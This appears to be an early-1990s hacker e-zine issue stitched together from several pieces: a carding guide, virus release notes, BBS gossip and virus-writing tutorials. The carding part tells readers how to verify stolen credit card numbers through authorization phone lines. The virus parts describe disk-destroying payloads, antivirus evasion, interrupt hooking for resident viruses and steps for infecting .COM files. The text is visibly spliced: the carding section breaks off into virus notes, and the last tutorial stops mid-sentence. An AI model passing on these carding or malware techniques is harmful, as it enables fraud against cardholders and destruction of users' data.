Carding Summary
Mechanix

$_Introduction:

    Over my years in the modem world, and especially in the computer
underground, I have seen tons and tons of hack/phreak textfiles written by
numerous people, some renown, some not. But the topic that I find sticks out
the most is carding. Whether because it is the most lucrative, or because it
does not take as much knowledge as the others, I don't know, but I find that
carding files are widespread. In any case, I started carding before I got into
modeming, and it was something I picked up from friends at high school.
However, my carding adventures lasted under a year, and then I was forced to
stop for legal reasons. However, I have decided to pick up all the carding
files I could find, and cram them all into this article. First off, I will not
deal with finding the cards or with how to purchase/phraud merchandise. These
topics are to vast, as everyone seems to have there own ideas on the matter. I
will discuss the technical aspect of carding, such as number format, card
format, bank identifiers... Secondly, most of this material is not original.
Some of it is, but a lot of it has been reprinted from old textfiles. The
sources are at the end of this article.

%Card Recognition:

    So now you have a credit card number (CCN). What next? Well first it helps
to know what kind of card it is, and what restrictions are imposed by that.
First of all, not all cards are alike. They fall into two groups: credit cards
and charge cards.
.Credit Cards work by credit (no, really?). This means each card has a fixed
 spending limit for each month.
.Charge Cards have no spending limit, at least none that are visible, but you
 still can't buy a boat with one, at least not the standard ones. Some *gold*
 cards have higher *prestige* and thus that invisible limit is raised much
 higher. The advantage with these is that you can card your ass off, but then
 again the companies are much tighter on security.

I will discuss four companies in this article, which are:
.Visa, Master Card, Discover : Credit Cards
.American Express            : Charge Cards

Now to find out what card you have the number to, the first digit of each card
company is different. Different cards also have different number formats.

  First Digit   Card Company        Number Format
       3        American Express    3xxx xxxxxx xxxxx
       4        Visa                4xxx xxx xxx xxx  or  4xxx xxxx xxxx xxxx
       5        Master Card         5xxx xxxx xxxx xxxx
       6        Discover            6xxx xxxx xxxx xxxx

Now with this you should be able to tell what card you have. If not, then
you're a fool.

%Card Checking:

    Now, you know what card you have the number for. But you still can't go
out and order your stuff. Why? Well simply because you don't know how long
this card has been good for. The number might be 6 months old, and that's not
very good credit. Now unless you got the plastic out of someone's wallet the
very same day, chances are the card has been reported stolen and it's no good.
If you picked the number off a carbon, then you still have to check if the
card has any money left on it. Getting numbers off boards is the worst,
because the number has probably already been abused to death. Now here are few
places where you can check the validity of your credit and charge cards. Note:
some numbers are unattainable from some areas. There are also many local voice
checking stations around, but I won't write these as they are dependant on
your area code.

.1-800-554-2265 : Visa, Master card, American Express
 When you connect you will be prompted to enter information through your touch
 tone phone. When all is finished, if the card is good you will get an
 authorization number, otherwise it will say declined. The format to enter the
 information is:

  Type # ID # Merch # CCN # Exp # Amount #  -Note: # is the pound sign on the
                                                   phone

  Type  : This is the number for your card: AMEX: 30
                                            VISA: 20
                                            MC  : 10
  ID    : This is the Bank ID. This is written on the card, but if you only
          have the number then enter 1067, this *usually* works. More on Bank
          IDs later.
  Merch : This is the Merchant Number. Usually, just enter 24 or 52.
  CCN   : This is your card number. Contrary to popular belief, the CCN *does*
          follow a precise mathematical formula. I, however, have not been
          able to find an exact symmetry, but it does follow an equation,
          guaranteed.
  Exp   : This is the expiration date. Some say that the expiration date does
          not matter as long as it is after the present date. Others think it
          is second security feature to check for invalid CCNs. In any case,
          the format is mmyy. That's 0893 for August 1993.
  Amount: Enter the amount in the following format: $$*›› where * is the
          asterisk on your phone. So $25.67 is 25*67. The amount you enter
          will be subtracted from the cards remaining credit. So if the card
          has $3000 remaining and you check it for $2000 it will accept the
          amount. But if you check it right after for another $2000 it will
          decline the request, even though you have not used it yet. This
          prevents users from going around charging $10,000 of stuff on a
          $2000 limit credit.

.1-800-233-5656 : Discover
 As above but the format is different.

  CCN # Merch # Amount # Exp #

.1-800-268-2405 : Master Card
.1-800-268-2410 : Master Card
.1-800-268-2530 : Master Card
.1-800-554-1111 : Visa, Master Card
.1-800-228-1111 : Visa, Master Card
.1-800-268-8261 : Visa
.1-800-268-8281 : Visa
.1-800-663-3611 : Visa
.1-800-528-2121 : American Express
.1-800-525-9040 : Discover

%Carbons:

    I'm going to draw the card format for Visa, Master Card and American
 Express so you can figure out where everything is on a carbon.

                           AmiLiA Virus
                          ~~~~~~~~~~~~~~
                    Creator: Rock Steady/NukE

  NOTES: Okay, this is it! My best virus yet! It is undetectable from
         ScanV85 (McAfee), and it is a stealth virus. The virus loads
         into resident memory and infects all .COM and .EXE files that
         are ran. One amazing note is that the virus hides in memory.
         MEM/C (Dos) will not report anything resident in memory.
         The only way you will notice the virus, is it will decrease your
         memory by about 1K. Anyhow, the virus is extremely smart and fast.

        -This Virus is a simple signature virus. Every Sunday it displays
         a message saying your system is infected with Amilia I virus.

        -Anyhow, I wrote this one quite a long time ago, though it never
         seemed to work. The stealth techniques never seemed to work. Though
         I fixed this problem and it is now out in the open. I didn't put
         any destructive codes inside due to I'd want to improve it and
         then put some destructive codes. You can call this virus a field
         test. Anyhow this virus is not related to the "Dark Avenger".
         Just because we all have the sources of Dark Avenger, lamers
         believe that I'd copy such a thing. Anyhow I thank my friends at
         the "Italian Virus Laboratory" for giving my the awesome tip of
         stealth techniques.

        -All infected files will increase of a size of exactly 1,600 Bytes.
         All dates of the files are restored and it will infect files that
         are either hidden or read-only or both...

       Hey, ACiD FaCE here, well with everyone asking
     about H‹V we decided to write up a report on what happened
     to H‹V and how we started ILLUSION v0.91.

       Well about seven months ago I got my hands on a copy of
     LSD-123.ZIP (Which were the source codes to LSD v1.23) and
     decided to make my own BBS program.. I worked very hard on
     this project of mine by myself.. Then when it was almost
     completed I gave a copy to The Chainmaster so he could be
     my BETA site. After about three days he asked for H‹V's
     source codes, I said no, but he said if I didn't give them
     to him, he would drop H‹V, so I had no choice, I gave them
     to him.. So naturally he called himself a programmer of H‹V
     while actually he did absolutely nothing on this project...

       Time passed, people asked me if they could also be a BETA
     site. But none of them where REALLY interested, so I still
     worked on H‹V. Then one day I called The Chainmaster voice
     and he was talking to The Illusionist on his other line. I
     told The Chainmaster to tell Illusionist to give me a call
     so he did, we talked for a long time and discussed our BBS
     programming projects, and I asked him if he wanted to drop
     Eternity and I'd drop H‹V and create a new program called
     ILLUSION, so we agreed and thought up about 80 ideas for our
     new project, but we also agreed to keep it a secret for the
     time being until we got far into the program.

       After about three months we told a few people about it and
     we started to post about it also.. Then The Illusionist set
     up his board on ILLUSION v0.91 and every time we would modify
     something we would use it and the users would notify him if
     any bugs where seen.

       I finally let The Chainmaster know what we were doing and
     told him "sorry, no more H‹V" and told myself "God FINALLY out
     of the queer club" (little joke from The Illusionist here).
     Well The Chainmaster is now running on Telegard, his board is
     doing fine - so is he, except that the tests he got were
     positive.

³ ILLUSION v0.91 Information  þ  Written by: The Illusionist  &  Acid Face  ³
ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

       Hi, The Illusionist here, to bring you a report on our
     progress with ILLUSION v0.91 (current beta version). Many
     options have been implemented in this revolutionary new
     Forum-PC hack to suit the needs of the most experienced
     sysops of the BBS community. The options added in this BBS
     program are a combination of some of the best options that
     have been implemented in diverse BBS programs on the market
     today (such as Celerity, ViSiON-X, etc). Our goal is to
     offer the best support for sysops and users while attempting
     to make this program as configurable as possible by removing
     the boring Forum-PC hack look.

       Are layout on this project is to bring the consumer
     (the sysop in this case) one of the best Forum-PC hacks
     available today on their home computer.

       You're probably telling yourself "Who the hell is The
     Illusionist?". Well surprise, this person has been on the
     Montreal BBS scene for over three years, you might know me
     better under the alias "QueenSryche". My first attempt at
     BBS programming came when the 514 area code became infested
     with Telegard, this program which was one of the most widely
     used BBS software in the world by the pirate community,
     became one of the lesser used because of it's monotonous
     look.

       Eternity (which was the chosen name of the BBS program)
     started as a little idea between The Smuggler (currently
     SysOp of 7-11 BBS) and I. Since we didn't want to write this
     program from scratch, we decided to use the LSD v1.23 source
     codes; our first mistake. These poorly written codes, seemed
     as if the programmer was drunk (or maybe on "LSD") when he
     wrote; procedures were all over the place and made a big
     mess. A lot of pointless efforts went into re-structuring the
     source codes, but with the "so many bugs" of this program,
     it made it disadvantageous to use it as a start up code;
     debugging something that you haven't written is a damn job -
     when the guy who wrote it doesn't know how to program.

       A lot of work was done with this program in a few months
     (before X-mas). The Smuggler and I were advancing with
     Eternity and thought it might become something... until
     School came up, both he and I didn't have much time to
     devote ourselves in programming Eternity. It became obvious
     that this program couldn't go further so we both stopped
     programming for a lapse of time. A few weeks later we got on
     it again, although we didn't feel much creativity, we forced
     ourselves to finally do some last minute design and compile
     it so that one of us could run it. The Smuggler decided to
     put his board up right away on Eternity (even though it
     wasn't really finished, it sure looked better than
     Telegard).

       Meanwhile a few weeks passed and I found myself stuck
     with a bad case of the "Stoned" virus on my HD. Later on I
     found out that it came from my disks. There was actually
     about three hundred 720k/1.44M disks infected with the
     "Stoned" virus. After spending a whole day cleaning these
     disks, it was too late for my hard drive. Thinking that I
     had rid of it from the "Stoned" virus, to my surprise, the
     "Omnicron" virus had deleted the partition and reconfigured
     it to be a "8 MEG DEVICE DRIVER", sounds weird, but
     according to PCTOOLS' DiskFix and Norton Disk Doctor, my 105
     meg drive was turned into an 8 meg device driver; So much
     for Eternity. The sources weren't backed up and I didn't
     feel like redownloading them from The Smuggler (that shows
     you how much I cared about Eternity). So I decided to lay
     back from the BBS scene for awhile because of my laziness in
     reinstalling MS-DOS 5.0 (which took me about 1 month to find
     a copy that worked). Thanks for the people who worried about
     me.

       In October 1991, after re-installing MS-DOS and Qmodem
     I decided to give a couple of old boards a call. To my
     surprise The Chainmaster's BBS was back up - running on HiV.
     First I did bad remarks about this program, one of my
     messages contained the following quote:

     "HiV? Is that a BBS program for Queers only!?"

       I guess it was as primitive as Eternity was. I downloaded
     HiV from a board and experienced some of the options it had,
     it was pretty original... NOT! most of the look and feel was
     taken from LSD v1.23 source codes, it was pretty lame to
     release it like that. But some of the things that the
     programmer had implemented in it, required some experienced
     knowledge of pascal programming, so I decided to contact the
     main programmer for HiV (Acid Face).

       He told me that he was sick of doing HiV because he was
     the only one working on it and other people taking credit
     from it (ie. The Chainmaster - claiming to be a programmer
     when he did barely 0.01 % of the work), and since I wanted
     to start out fresh the BBS program from a different source
     code that had, somewhat, and intelligible starting BASE, I
     picked ViSiON, although most of the codes were identical to
     LSDs, some of the coding was pretty time saving, such as the
     Configurable file listing, graphical interface, originality,
     organization and many other options. I have to congratulate
     the programmers for making this possible (as well as the
     person who released the source codes), else ILLUSION would
     have taken a lot more time to get to where it is now.

       "How ILLUSION was started" does thy ask? A few days
     later I got in contact with Acid Face. From there we
     discussed the possibility of him and I working on a BBS
     program that would be a effervescence to the Modem Industry.
     Many ideas came up, of which 26 pages were composed, and a
     particular one came up, one being of designing our software
     to take full potentiality of the 80386/80486 as well as an
     Optimum USRobotics 14.4k Tuning and support via protocols
     and display sending speed. Projects such as making this
     program VGA with it's own terminal have been discussed but
     it's too early to determine what will become of this
     program. If we were ever to invest in such a project, there
     would still be two version of this program, one being the
     ILLUSION/VGA and one being ILLUSION - doing this would
     demonstrates support for both SysOps who wish a normal BBS
     and for the ones who want the next generation in BBS
     Software.

       People have been chatting about a protocol called
     HSLink (which is a protocol that uses FULL v32bis/v42bis
     transfers both ways), our plans is to implement it, using a
     powerful protocol such as this one could be time consuming.
     Protocol compatibility will be superior to any program, with a
     wide selection of over 40 protocols and more, when you think
     about it, running this program next could be your best
     resolution for 1992 as well as one of the best moves you
     have done.

       Continuous update with our "No Fuck-overs" policy,
     Sysop support will be our first priority; getting the sysop
     the updates on time, keeping him informed on the program's
     progress, helping him on any possible questions he might
     have, as well as a full account on the Home board for
     Illusion, what more can you ask for?

       Since we are working hard on this project and spending
     a lot of time on it, we have decided to settle on it for the
     little fee of $35.00 in Canadian funds which would entitle
     you to get 5 upgrades (1 upgrade every month). But for now
     Illusion is not for general distribution, it is still in
     it's early beta testing state. But in a few months it should
     be widely distributed as a demo version for which you will
     be able to download on your local boards.

       Anyways, since we are in need of a lot of help from
     users and sysops, anybody (sysops) who are interested in
     becoming a BETA Test-Site for ILLUSION will have to come and
     fill out and ®BETA Site¯ application form on Eternal
     Illusion (514) 582-3786, Your job as a BETA Test-Site will
     be of filling out a form every week with bug reports, for
     sysops who are devoted to their BBS and others, are low in
     cash, well take this into consideration.

       Eventhough I expect ILLUSION to be a big BOOM in the
     Modem Community, for now we are still limiting 3 boards per
     area code to run it, for personal reasons (we haven't made
     plans yet on handling more than 100 boards). If you're
     interested, contact either The Illusionist or Acid Face for
     a demo copy (which will be available soon).

     Thank you.

             The ILLUSIONist '92 [Programmer/Author]

Future Plans
Rock Steady

Anyhow I'm presently working on two different types of viruses. I will try
to explain the "High-Points" of my viruses.


Virus Name: Common Cold
Features..: TSR Virus Infecting .EXEs & .COMs Executed.
            Stealth virus that hides in High memory under the TOM
Approx Size.........: 1,400-1,600 Bytes
Percentage Completed: 80%
Release Date........: February 1st, 1992

NOTES: This virus will infect all Files executed or ran in the system.
   And every Second Monday the virus will do a Low Level format for ALL
   Hard Drives available in the system.
  -This Virus Will mainly be created for the purpose of a lack of deadly
   viruses going around. This virus will be a strain of the `AmiLiA' virus
   that is named after my babe, but refuses to accept another strain that
   will cause a little damage.

                        ---------/---------

Virus Name: ParaSite ]I[
Features..: Virus Infecting only COMs
            Stealth techniques to hide as much as possible from Scanners.
Approx Size.........: 1,200-1,400 Bytes
Percentage Completed: 50%
Release Date........: Mid February, 1992

NOTES: This Virus will infect all COMs files in the system. And the
   COMMAND.COM will ALWAYS be checked to make sure it's infected. If not
   it will be.
  -This Virus WILL Check to see if FlushShot & VShield is Resident in
   memory. If so it will NOT run because this will stop the virus
   Red-Handed.
  -Like ALL the ParaSite Viruses this too will annoy the user every so often
   but it will not tell the user directly he has a virus. The ParaSite
   Virus will Make "Sounds In the PC Speaker" the Virus might Re-Edited
   the CMOS and remove the HD from configuration.
  -The COM ports might not want to function. And the screen may even
   flicker every so often.
  -All these Wonderful feature MAY happen or NEVER happen. Because the
   virus will have a random generator to decide if it will cause damage
   or just infect another file.
  -An Algorithm Encryption may be imposed in this Virus. If it is NOT
   imposed inside There WILL be another Virus Release with an Algorithm
   Encryption. This factor depends if SIZE permits. Because I DON'T want
   this virus to pass 1,500 Bytes in Length.

Viral Developments
Rock Steady

    Before we begin the "Viral Development" section of this Infojournal I'd
like to explain briefly a few words I have on our so-called Virii-World.

    What is the challenge or thrill one gets out of creating a virus. Is it
because you enjoy making these dangerous programs, watching the world cry and
fear for help? Is it because you lust watching your enemies die a painful
death? If this may be the case I hope you get professional help soon. Just
because all of you newcomers believe this, it may not be the case.

    Making a virus should be a challenge, a quest for progressive technology.
We all have witnessed the "Desert Storm" since our neighborly friendly CNN
Press have bombarded us with some close-up action shots. And we all know how
"Successful" the war went technology wise. Part of that success was granted to
a computer program we all scream with fear, and called John McAffee for help.
Yes, a virus, was programed into a EPROM Chip and placed into a printer that
was in the process of being smuggled into Iraq long before "Desert Storm"
took action. Its main function was to dissable Iraq computers during
anti-attack times.

    Viruses are used by US intelligence to help conquest certain missions. And
the goal for every programmer should be to program a virus that can outsmart
our friends at McAffee. A great example are the Whale virus and the V2P2
Family. And when I say program, I mean you take out a text editor and program
something TASM can gobble up. NOT taking one's virus and compressing it to
avoid detection. That is not known as programming. So please restrain from
calling yourselves "Viral Programmers" when using PkLite or LZExe compressors
and editing out the label header.

    Lastly, I hope we now can form a Viral Development Research center that
will bring forward our conquest. This is only constructive criticism. I know
several will get offended and perhaps return crude remarks. If so then be it.
But I just do not want to see several hundreds "Overwritting" virii as a new
virus to come before me. Every Day I have users that confront me about this
new "Undetectable" virus. Where only I request to learn from theses new virii,
so that we can progress. But about seconds after receiving the virus I see it
is only a "Overwritting" virus. I must state the fact I never programed a
overwritting virus. Because they seem to easy. And there is about 100+ source
codes of overwriting virii everywhere. If the heat is too much for you to
program a real virus then just get out, because overwritting virii will hurt
the name you work long hours to build. Anyhow focus on quality rather than
quantity. It is the basis I try to program with. Anyhow lets get on with the
Infojournal.

Word from the President
The Darkman

    Well , here we are again. It is my guess that if you're reading these
words right now, you probably enjoyed the first Infojournal. Well, you're in
for a mighty treat with this one.

    The group has undergone major changes since the last Infojournal. Many
useless members have been discharged, and more competent members have joined,
such as Nowhere Man, a very proficient C and Assembler programmer. We have
also accepted a big merger between an Australian based group known as SCP,
Southern Corrupted Programming. We have also gained a superb site, the BBS
known as Hell's Pit, in 708.

    We have also gained much knowledge. I figure it will show in this
Infojournal, just by the way it was written. You know, in my first intro,
when I introduced my theory of Nuclear Energy, I never figured it would have
effect on us. The more we know, the more we want to know, and the more we
learn. We have gotten to the point where we SEARCH for knowledge, digging it
out wherever we can.

    We have also had many stop signs during this period. I name one, the Rabid
affair. I see all these trials as tests. If we make it through, it's because
we're tough enough to make it. The day hasn't come when we will meet up with
an obstacle meaning our demise.

    All I have talked about in this present intro, will be studied further
with the journal. Ah yes, one more thing. One of our good friends and members
had a very bad surprise in January. Someone had beige boxed him for 1300$. I
am talking about Prince of Thieves, from BC, Canada. I dedicate this
Infojournal to you, PoT, and wish you a prompt return to the best of the
best.

Once again, I remind you this:

<< Nuclear Energy, the power of tomorrow >>

About NuKE
Mechanix

    Before, I let you get on with this Infojournal, I would like to clear some
things up about NuKE. Firstly, and most importantly, NuKE has not crashed a
board since it's creation, and we do not plan to. We may make programs that
have this use, but we have never used them ourselves for personal uses. As I
stated on many occasions, we are not responsible for what people might do with
our releases. It's not cause you build a gun that you are responsible for
every shooting that takes place. This is especially directed to all those
implicated in the Optic Fiber incident, who by the way is not in NuKE anymore
for legal reasons. Next, NuKE does not go around infecting people and software
with virii. We make them, sure, but we don't go around nailing everyone just
for the sheer pleasure of it. Next, all programs and material produced by NuKE
are original and are not just cheap hacks of others. Take this Infojournal for
example. I dare anybody to show me something that looks like it. It comes from
my own design and ideas, and I take full responsibility and credit for any
bugs or others found in this program, if used properly and unmodified. I
stress the unmodified, as some lamer is bound to modify the articles. I could
have put a better crypting routine, but it would be a waste, and if anyone
wants the original, download it off my board or any other NuKE site. Lastly,
we are not in competition with anyone, and exist only to suit our purposes. We
may have had arguments with groups like RABID and HiF, but we couldn't care
less what happens to these groups. Now, I will let you get on with this
release.

Contruction Kit for TSR Virii
Rock Steady

    There are several ways to constructed your viruses. Mainly you have those
which are RAM-Resident or better known as a TSR program. And with great
thought we have those which are not RAM-Resident.

    A TSR virus will load into memory and can infect all programs that are
executed by the computer. Such like my AmiLiA virus which will infect all
EXE and COM files that are ran. Anyhow a TSR virus can certainly spread a lot
faster compared to a Non-Resident Virus. Because a NON-Resident Virus will
only infect file each time it is ran. Though the NON-Resident will start
off very slowly infecting the system files but after the virus is in the
system after a number of weeks, it will certainly infect ALL files that are
in the system. Where a TSR virus will USUALLY infect files that are executed.
So that only files that are often executed will be infected. But The TSR
virus can certainly infect A LOT more files than a Non-Resident JUST on the
first Hour! It is out numbered 10 to 1. This is the advantage that all
programmers enjoy and program TSR viruses. I will explain a SIMPLE method of
making your program a TSR one. And it will be as flexible as you want so
that NO ONE can stay you `Stole' this information off Rock Steady.

    Anyhow I will explain the simple Process of Intercepting ROM-Bios
Interrupts and hooking your virus/Program to any Interrupt of your choice.
This method that is being explained is also used ALL the Jerusalem Strains.
And several of the Vacsina Strains. They total up to close to 100+ Viruses
that use this simple way with the TSR Interrupt 27h. Anyhow just because I'm
explaining this method your virus CANNOT be detected because of this TSR
routines because there are routines I DEVELOPED ALONE and will soon to be
release in one of my future virii. Anyhow there are an UNLIMITED amount of
ways to make TSRs so that along as you Develop YOUR OWN routine it will NEVER
get detected as a virus for all you Beginners. And how this routine can be
used in several OTHER utilities not just viruses.

                            Beginning...
                            ~~~~~~~~~~~
    First we must Intercept an Interrupt, Lets say we want our virus to
activate Every TIME the disk I/O is being used we would use INT 13h or
INT 21h. The INT 13h will activate everytime ANY file is opened or Closed
And the INT 21h will activity anytime any file is executed or any INT 21h
functions Like a "DIR" in DOS. If you want you can even hooked your virus
to INT 10h and it may activate when Graphics are displayed, or you can hook
it to the interrupt involved with Printer Functions. Whatever seems to
`EnLighten' you, since we live in a Distressed world, I won't even bother
why we shouldn't hooked them up to just ANY interrupt.

    Anyhow, interrupts use a vector table at the bottom of memory (ROM) to
find out what routine in the ROM Bios to call. So the address for Interrupt
21h would be located at 0000:0084 and for Interrupt 13h it would be found at
0000:004Ch. So we can change theses addresses in the vector table. What we
do is we change the vector address to POINT to our virus. So everytime the
Interrupt is called it goes to the vector table and the table tells it to
call our Virus, rather than calling the ROM Bios. But what MUST do
FIRST is save the ORIGINAL Interrupt routine and place that somewhere in
memory. So that our virus will call the Original ROM Bios routine after
executing itself.

    Lets say we hooked our Virus to the INT 13h, which controls all Disk
Activities. So if our Computer users tries to read something from the disk
the Computer will call the INT 13h bios Routines on How To do it. But
instead of finding the INT 13h routines it calls our virus, and the Virus
gets ran, which then our virus does what it has to do, and then runs the
Original INT 13h Routine where-ever it was stored. So it simulates an INT
call to the ROM bios routines.

The Itti-Bitty Virus
Nowhere Man

I. Introduction

    The Itti-Bitty virus started as a challenge to myself to see how small I
could make a fully-functional virus.  The one to beat was Tiny, an appending
virus with a size of 163 bytes.  Tiny didn't change directories, didn't affect
read-only files, didn't reset file date and times of infected files, didn't
do anything destructive, and was easily flagged down by Virex-PC or Flu-Shot+,
as well as the fact that McAfee SCANned it.  First, I settled on an
overwriting virus.  Either way the checksum of a file is going to change, and
overwriting aren't as noticeable from the DIR point-of-view, and overwriting
would require fewer bytes of code to do the job.  Then I coded the thing and
started optimizing.  The result was the 161-byte Itti-Bitty virus, strain A.
Then I ripped out extraneous code, the "bells and whistles," if you will, and
ended up with the 99-byte Itti-Bitty strain B.  Both virii are non-encrypting,
and both have the same effect:  they overwrite the first 256 sectors of C:
with random garbage, making the disk unrecoverable by normal means.  Since I
figured it would only be a few weeks before someone disassembled my virii, I
decided to distribute the original source, so that others can learn from my
code.


II.  Strain A

    Strain A of the Itti-Bitty virus is 161 bytes in length.  It detects the
presence of Virex-PC and Flu-Shot+ by calling interrupt 21h with AX set to
FF0Fh.  If either of these TSR virus-protectors are loaded, then Itti-Bitty
aborts, stopping premature detection and allowing the victim to (doubtfully)
spread the infected file.  Then it tries to infect any uninfected .COM file in
the current directory by overwriting the start of it with itself.  Read-only,
etc. files ARE affected, and their attributes are reset after the infection
is complete.  File date and time are also preserved for better stealth.
Finally, a bogus error message, "EXEC failure," is displayed and control is
returned to DOS.  ("EXEC failure" was the shortest fatal error message I could
find in COMMAND.COM.  I've never seen anyone get it, but it is legit, and
it's obscure enough to scare novice users.)  If all files are infected, then
as I stated above, their C: disk is trashed and the computer is locked up.  No
message, no fanfare, no nothing; their just plain fucked.  That's it. Only
161 bytes, too.


III.  Strain B

    Strain B of Itti-Bitty is simply Strain A with the Virex check, the
attribute alteration, and the date/time preservation removed.  It still
trashes C:, but is far more noticeable, since, like I said, file date and time
aren't preserved.  Also, no error message is displayed.  (You'd be surprised
how many losers will keep running the thing over and over because nothing
seems to happen.)  All under one-hundred bytes.  That's damn small.


IV.  Miscellaneous comments from Nowhere Man

    I'd like to use this space to say a few things to everyone.  First, I'd
like to announce that I'm now affiliated with [NuKE] and [NuKE] WaReZ, a fine
Canadian hacking/phreaking/carding group.  Look for other fine [NuKE] warez,
such as the infamous Parasite virus and the Telegard Bypass trojan, at a
respectable h/p board near you.
    Secondly, I'd like to say Hi to Software Spartan, Murdak and Leeking
Virus at the Pirate's Guild, and The DarkMan and all the other great guys at
[NuKE].
    I also want to challenge all of the other virus-writing groups (F‹S,
RABID, etc.) out there to come up with a smaller virus with the same features
(or better ones); I think we can use some friendly competition, and besides,
competitiveness leads to better virii for all.
    If anyone can find a way to make Itti-Bitty Strain A or B smaller while
still keeping in all of the features, or if you have a question, comment, or
complaint about Itti-Bitty, C-Virus, or any other fine product from Nowhere
Man, I can be reached at either the Pirate's Guild, or Hell Pit.

To hack or not to hack
The Darkman

    "I'm a hacker!!!" is the most common phrase in the computer
underground these days... What is a " Hacker " ??? Well, about 5 years
ago, if you called yourself a computer hacker, you had a reason to be
proud... A computer hacker used to mean a guy that could get around
where he wanted on any computer system, do anything with his own
system. Basically, a CPU Wiz... Now, hacker has turned into a truly
ugly word, used mainly by lamers and wanna-be's...

    First of all, a guy calls himself a hacker if he has crashed a
BBS... Come on people!!! If being a hacker meant crashing boards, anyone
could be a hacker... Which is not the case... I must name the defunct
group HiF for being the guiltiest of those so called " Hackers ".
Luckily, those kind of Hacking groups have died off... None are left.
Unless you can count FiS for being still in, because Dallas Barr kinda
thinks he still stands a chance. HiT, HiF, etc... All gone.

    Second activity that has been labeled Hacking, is the editing of
certain programs... Like for example Illuminatus... It takes a real
brainy Hacker to modify a source code for a magazine, doesn't it???
Again, people call this hacking... Or more in our case, taking a virus
code, and making it unscannable... Or BBS progs... More precisely, the
Forum "Hacks". I personally am against people modifying Magazine
sources... Like the people that did Illuminatus worked hard at their
feat, only to see it treated like shit by people to lazy to do they're
own.. Even a group of programmers, like RABID had to use someone
else's source... Pathetic...

    The most common activity associated with Hacking, is being able
to infiltrate networked systems, or computer environments such as
TymNet, DataPac, VAX/VMS, UNIX or PRIMOS... That is more like it.. The
hacking I know has to do with much more though... There is infiltrating
Bell systems, Electrical companies, basically all Utility companies, and
best of all, banks!!! And much to my dismay, most of the best hackers
are now defunct... MCI Sprinter, we will miss you... Snifffff.

    I hope this will now stop the uprising of a multitude of new
" Hackers " in the future, and also maybe re-instating the status of
being a Hacker, so we can be proud once more of being one...

Parasite Virus IIB
Rock Steady

                     -  ParaSite Virus IIB  -
                 -  Programed by: Rock Steady  -
                   -  Completed December 8th  -

         Length 909 Bytes            Undetectable from SCANV85

  NOTES: Anyhow I seem to have improved one of the first virii I've
     ever programed. Anyhow lots of changes have gone into this virus
     compared to the original Parasite.

  FEATURES: The functions of the this virus is mainly the same as the
     original virus. Which is that when ran it contains a random
     generator that will infect all .COMs 70% of the time. And it will
     play machine gun noises on your PC Speaker then reboot. and 10%
     of the time it will reboot your system. And if the virus is ran
     on Mondays, it will overwrite the BOOT and FAT areas of your HD.

  IMPROVEMENTS: I scrambled several lines that would of made it a
     clone of the first Parasite. Meaning, if SCAN detect Parasite
     it will not detect Parasite II. Because of the bytes that
     were scrambled all over the virus. And I improved a fast and
     better way of infection. The virus will now always try to infect
     COMMAND.COM. Anytime it is activated it will infect a .COM and
     then check to see if COMMAND.COM is infected. If not it will
     be infected. So even after being cleaned out, if the user forgot
     just one file it will infect COMMAND.COM and boom, the whole
     procedure starts again. Even if files are hidden or read only
     they will be infected. And dates are not changed. And no
     memory is taken up. The file will just increase by a mere 909
     Bytes. Anyhow enjoy!

The RABID Affair
The Darkman

    Everyone knows by now about the run-in between [NuKE] and RABID...
But unfortunately, not many people know the true story... And believe
it or not, I only found out some of the truth during the Christmas
holidays... This is how it goes...

    When [NuKE] first started, we had the outmost respect for the
group called RABID, a group we considered at the time to be our
idols... One of our star programmers, Rock Steady, wanted to show
RABID what we were capable of, in the hoping of attracting some
attention. Rocky, being a Hype kinda guy, uses a language that is
often mis-interpreted when read. Part of the text string within the
virus code of the Parasite virus, was the phrase; RABiT, RABiT,
RABiT... Eat This! Which was, for the first part, an inside joke between
a few of our friends, and for the second part, an invitation to check
it out...

    Well then, along came a guy named Time Lord. Time Lord, being
a lonely guy, begged the Rabid guys to be a member, so finally they
accepted... So this guy Time Lord, hounded me until I almost took a
fit, following me to every board I went, capturing my messages, etc.
Until he finally came across the Parasite Virus. Ahhh!!! now there was
an opportunity to fuck up those NuKE guys for good!!! And so he told
them about the text string.

    Next thing I know, I receive this letter from a Rabid member, by
the name of Data Disruptor, whom I believed as everyone else to be
of the age of 30+ years old, so they said. The letter, titled: NuKE...
Prepubescent Egostical Geeks, basically told me off, and demanded a
written apology. And me, not wanting a war with a group I personaly
admired, called up Rock Steady, and we wrote an apology. And it was
posted on the Members Only base of RabNet... Well, I receive another
letter saying it was to late to apologize, and virus warfare was going
to break out in 514... ( Yeah, Sure... )

    Anyways, they then released a newsletter of they're own, called
CENSOR... And again, all they could do was diss us... They basically
made a fool of themselves, just before they're break-up... Why they
broke up? Nobody knows... But it's a relief to all... Having an immature
group like RABID making and spreading virii, is a scary thought...

    And now for the funny part called, THE TRUTH... Data Disruptor,
the 30 year old assembler star from Bulgaria, is actually a 17 year
old punk from Toronto... Yes folks, you've heard it... A punk... Colored
hair, and all... So Mr Disruptor has been programming ASM like a star
since he's 12 years old... (NOT!) So finally, we have the truth about
the RABID AFFAIR... And also about Data Disruptor.

Construction Kit on infecting .COM
Rock Steady

    Well I must state my opinion that there are certainly WAY too many
Overwriting Viruses out here. To help put a Stop to this I will try
to explain to you a SIMPLE way to infect COM files at the END of the
Program. This routine WORKS if you follow my steps correctly, and
I've already used this in my `ParaSite ][' Virus.

Anyhow this is a brief description what the ASM Source will do.
            1. Find a .COM file in the current Directory
            2. Save the Date and File's Attribute.
            3. Save the First 3 Bytes in a Stack
            4. Infect the File & restore new 3 bytes..
            5. Put the OLD date and File Attributes back on

                         Beginning...
                        ~~~~~~~~~~~~

;----------------------------- EnD -------------------------------------

Anyhow that's it... Simple no? This source was also used in my ParaSite ][
Virus that is STILL undetectable to date with Scanv85. Anyhow I even made
it MORE simpler than my real sources that have to play with the file paths.

Anyhow theres still work to be done, like you must restore the old data file
so it will jump to 100h and run the old file the virus was infected too!
Remember to store them in the beginning and then restore them! Anyhow there's
a few Variables to be put in like `VirLength' which you should know how to
do that also the `CodeLength' that is the VIRUS codes ONLY not counting the
Stacks.

Anyhow This works FINE with a Non-Resident Virus. Because a few statements
would have to be edited for TSRs. Anyhow try to use this, it's small neat
and fast.

Anyhow Perhaps next issue I will develop a SIMPLE Ram-Resident virus that
